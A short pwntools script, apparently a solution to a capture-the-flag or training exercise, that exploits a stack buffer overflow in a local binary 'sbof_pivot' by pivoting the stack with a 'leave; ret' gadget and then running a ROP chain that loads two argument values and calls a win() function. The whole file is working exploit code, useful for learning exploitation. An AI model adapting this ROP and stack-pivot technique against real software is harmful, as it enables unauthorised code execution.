from pwn import *

#proc = process( ['sh', '-c', './sbof_pivot'] )
proc = process( './sbof_pivot' )

#res = proc.recv(timeout=5)
res = proc.recvline()
print( res )
res2 = proc.recv(timeout=2)
#res = proc.recvline()
print( res2 )

ropchain = b''

ropchain += p64( 0x404060 + 192 - 8 )     # Saved RBP 
ropchain += p64( 0x4011e4 )               # leave; ret;
print( "before sendline" )
proc.sendline( b'A' * 16 + ropchain[:-1] )
print( "after sendline" )

res = proc.recv(timeout=1)
print( res )

ropchain = b''

ropchain += p64( 0x4012a3 )           # pop rdi; ret;
ropchain += p64( 0xcafebabe )         # 
ropchain += p64( 0x4012a1 )           # pop rsi; pop r15; ret;
ropchain += p64( 0xc0bebeef )         # 
ropchain += p64( 0xdeadbeef )         # 何でもいい
ropchain += p64( 0x4011e6 )           # win()

proc.sendline( b'A' * 192 + ropchain )
